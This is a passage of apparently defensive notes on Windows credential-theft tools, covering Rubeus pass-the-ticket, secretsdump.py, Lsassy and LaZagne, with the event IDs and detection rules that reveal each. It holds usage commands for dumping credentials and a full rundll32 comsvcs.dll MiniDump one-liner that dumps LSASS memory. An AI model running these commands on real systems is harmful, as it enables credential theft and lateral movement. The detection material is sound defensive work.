    Rubeus.exe monitor /interval:30
    ```
    * Pass the ticket
    ```cmd
    Rubeus.exe ptt /ticket:<base64 strings>
    ```
    * `klist` to view ticket

### Detection

Look for TGT renewals or TGS requests with a particular Account/Client pair that have no associated TGT request for the same Account/Client pair.

Additional method includes correlating `Get-LoggedOnUsers` with `klist`


-------------------------------------------

# Secretsdump.py

## Characteristics

Script used to extract credentials and secrets from a system. Use-cases:
* Dump NTLM hash of local users (Remote SAM dump)
* Extract domain credentials via DCSync.

## Normal Usage
```bash
python secretsdump.py <domain>/<user>:<password>@<dest>
```

## Detection 1
* Tool enables **RemoteRegistry** service on remote endpoint. Stopped state by default. Can be found on System EVTX:
    * `7040`: The start type of the RemoteRegistry was changed from disabled to demand start. Vice versa.
* Security event log:
    * Event id 4624 (type 3): network logon and NTLM authentication package. Key length 0.
    * Event id 4672: special privileges assigned to logon. Check for **SeDebug or SeBackup** privileges.
    
### Running processes
```cmd
services.exe -> Create Process -> svchost.exe (C:\Windows\System32\svchost.exe -k localService -p -s RemoteRegistry)

lsass.exe -> Open OS Process -> svchost.exe (C:\Windows\System32\svchost.exe -k localService -p -s RemoteRegistry)
```

## Detection 2
* Configure Security Access Control List: Change ACL to log access to the HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg registry value. Auditing permissions to everyone.
* Configure regisry access auditing in Local Security Policy -> Security Settings -> Advanced Audit Policy Configuration -> System Audit Policies - Local Group -> Object Access -> Audit Registry.

-------------------------------------------

# Lsassy

## Resources
* [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)
* [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

## Characteristics
Uses the MiniDump function from `comsvcs.dll` in order to dump the memory of the LSASS process. Can only be performed as SYSTEM, so it creates a scheduled task as SYSTEM, runs it and deletes it.

Uses `impacket` to remotely read necessary bytes in lsass dump and `pypykatz` to extract credentials.

## Usage
```bash
lsassy -d <domain> -u <username> -p <password> <targets>

lsassy -d <domain> -u <username> -H [LM:]NT <targets>
```

## Detection

### Forensic Artifacts
* Security EVTX:
    * `4624`: Logon type 3. Gives source IP and logon username.
    * `4672`: 
        * Logon Username
* System EVTX:
    * `7045`: New service installed in the system
        * Service filename: `cmD.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B \Windows\Temp\<dump>.odt full`
### NWP
* `Indicators of Compromise`
    * `remote scheduled task`
* `Filename`: possible indication of `.dmp` file
* Application rule
```bash
service=139 && directory='windows\\temp\\' && filename='tmp.dmp'
```

### NWE
* `Behaviors of Compromise`:
    * `enumerates processes on local system`
* Filter on `filename.dst='lsass.exe'`
    * Check `Source Parameter` for possible `minidump` invocations via `rundll32.exe`.
* Application rule:
```bash
device.type=`nwendpoint` && category=`process event` && (filename.all='rundll32.exe') && ((param.src contains 'comsvcs.dll' && param.src contains 'minidump') || param.dst contains 'comsvcs.dll' && param.dst contains 'minidump')
```

-----------------------------------------------------------------------

# LaZagne
* [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)
